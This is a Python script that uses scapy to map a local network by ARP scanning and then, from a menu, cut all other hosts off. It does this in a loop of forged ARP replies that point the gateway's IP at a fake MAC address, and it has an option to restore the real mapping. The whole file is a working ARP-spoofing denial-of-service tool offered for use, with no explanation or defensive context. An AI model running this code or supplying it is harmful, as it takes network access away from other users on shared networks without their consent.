import os
import socket
import netifaces
from threading import Thread
from scapy.all import *

multi_vlan = False
deauth_active = True
network_devices = []
known_vlans = []
deauth_mac = "AB:CD:EF:12:34:56"

gateways = netifaces.gateways().get("default")
for family in gateways.keys():
    gateway = gateways[family][0]
    break

computer_ip = socket.gethostbyname(socket.gethostname())
computer_vlan = computer_ip.split(".")[2]

gateway_ip = gateway
gateway_vlan = gateway_ip.split(".")[2]

responses, uans = arping(gateway_ip, verbose=0)
for response in responses:
    gateway_mac = response[1].hwsrc
    break

network_id = ".".join([gateway_ip.split(".")[0],gateway_ip.split(".")[1]])

if gateway_vlan != computer_vlan:
    print("Found more than one VLAN on network " + network_id)
    print("  Gateway VLAN:  " + gateway_vlan)
    print("  Computer VLAN: " + computer_vlan,end="\n\n")
    multi_vlan = True
    known_vlans.append(gateway_vlan)
    known_vlans.append(computer_vlan)
else:
    known_vlans.append(computer_vlan)

def sendCustomARPRequest(target_ip, target_mac, gateway_mac, gateway_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet,verbose=0)

def scanAndShowDevices():
    global network_devices
    for i in range(2):
        for vlan in known_vlans:
                ips = network_id + "." + vlan + ".1/24"
                reponses, uans = arping(ips,verbose=0)
                for response in reponses:
                    data = (response[1].psrc, response[1].hwsrc)
                    if data not in network_devices:
                        network_devices.append(data)
    print("List of found devices on network "+network_id,end="\n\n")
    print("IP\t\t\t\tMAC")
    for device in network_devices:
        print(device[0] + "\t\t\t" + device[1])
    print("\n")

def showOptionsMenu():
    print("Please select an option")
    print("[1] Deauth Devices")
    print("[2] Restore Devices")
    print("[3] Rescan + Show devices")
    print("[4] Show this menu")
    print("[5] Exit program")

def deauthNetworkDevices(network_devices):
    print("[THREAD] Deauthing devices")
    while 1 == 1:
        if deauth_active == True:
            for device in network_devices:
                if device[0] != gateway_ip and device[0] != computer_ip:
                    sendCustomARPRequest(device[0], device[1], deauth_mac, gateway_ip)
        else:
            print("[THREAD] Restoring devices")
            for device in network_devices:
                sendCustomARPRequest(device[0], device[1], gateway_mac, gateway_ip)
            break
    return

def sendRestoreRequest(network_devices):
    print("[THREAD] Restoring devices")
    for i in range(2):
        for device in network_devices:
            sendCustomARPRequest(device[0], device[1], gateway_mac, gateway_ip)
    return

showOptionsMenu()

while 1 == 1:
    option = input("[1/2/3/4/5]: ")
    if option == "1":
        Thread(target=deauthNetworkDevices, args=(network_devices,)).start()
    elif option == "2":
        deauth_active = False
        Thread(target=sendRestoreRequest, args=(network_devices,)).start()
    elif option == "3":
        scanAndShowDevices()
    elif option == "4":
        showOptionsMenu()
    elif option == "5":
        exit()
    else:
        print("Please enter a number that matches and option")
